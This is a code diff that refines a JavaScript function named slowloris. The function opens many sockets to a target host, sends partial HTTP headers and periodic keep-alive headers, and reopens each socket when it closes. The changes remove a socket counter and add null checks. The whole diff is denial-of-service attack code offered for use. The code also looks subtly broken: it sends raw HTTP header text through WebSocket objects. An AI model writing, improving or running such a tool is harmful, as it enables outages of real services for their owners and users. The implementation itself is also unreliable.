@@ -20,7 +20,6 @@ function slowloris(target, numSockets) {
         console.log(`Slowloris attack on ${hostname}:${port} using ${numSockets} sockets.`);
 
         const sockets = new Array(numSockets);
-        let openSockets = 0;
 
         for (let i = 0; i < numSockets; i++) {
             createSocket(hostname, port, i, isSecure, path);
@@ -39,7 +38,6 @@ function slowloris(target, numSockets) {
 
                 socket.on('open', () => {
                     console.log(`Socket ${index + 1} opened.`);
-                    openSockets++;
                     sendInitialHeader(socket, hostname, path);
                     setInterval(() => {
                         sendKeepAliveHeader(socket);
@@ -48,7 +46,6 @@ function slowloris(target, numSockets) {
 
                 socket.on('close', () => {
                     console.log(`Socket ${index + 1} closed.`);
-                    openSockets--;
                     cleanupSocket(socket, index);
                     setTimeout(() => {
                         createSocket(hostname, port, index, isSecure, path);
@@ -57,7 +54,6 @@ function slowloris(target, numSockets) {
 
                 socket.on('error', (error) => {
                     console.error(`Socket ${index + 1} error: ${error.message}`);
-                    openSockets--;
                     cleanupSocket(socket, index);
                     setTimeout(() => {
                         createSocket(hostname, port, index, isSecure, path);
@@ -65,7 +61,6 @@ function slowloris(target, numSockets) {
                 });
             } catch (socketError) {
                 console.error(`Error creating socket ${index + 1}:`, socketError);
-                openSockets--;
                 cleanupSocket(socket, index);
                 setTimeout(() => {
                     createSocket(hostname, port, index, isSecure, path);
@@ -76,7 +71,7 @@ function slowloris(target, numSockets) {
         function sendInitialHeader(socket, hostname, path) {
             const initialHeader = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nConnection: keep-alive\r\n`;
             try {
-                if (socket.readyState === WebSocket.OPEN) {
+                if (socket && socket.readyState === WebSocket.OPEN) {
                     socket.send(initialHeader);
                 } else {
                     console.warn(`Socket ${sockets.indexOf(socket) + 1}: Not open, cannot send initial header.`);
@@ -91,7 +86,7 @@ function slowloris(target, numSockets) {
         function sendKeepAliveHeader(socket) {
             const keepAliveHeader = "X-Custom-Header: keep-alive\r\n";
             try {
-                if (socket.readyState === WebSocket.OPEN) {
+                if (socket && socket.readyState === WebSocket.OPEN) {
                     socket.send(keepAliveHeader);
                 } else {
                     console.warn(`Socket ${sockets.indexOf(socket) + 1}: Not open, cannot send keep-alive header.`);
@@ -105,8 +100,10 @@ function slowloris(target, numSockets) {
 
         function cleanupSocket(socket, index) {
             try {
-                if (socket && (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING)) {
-                    socket.close();
+                if (socket) {
+                    if (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING) {
+                        socket.close();
+                    }
                 }
             } catch (closeError) {
                 if (index !== undefined) {
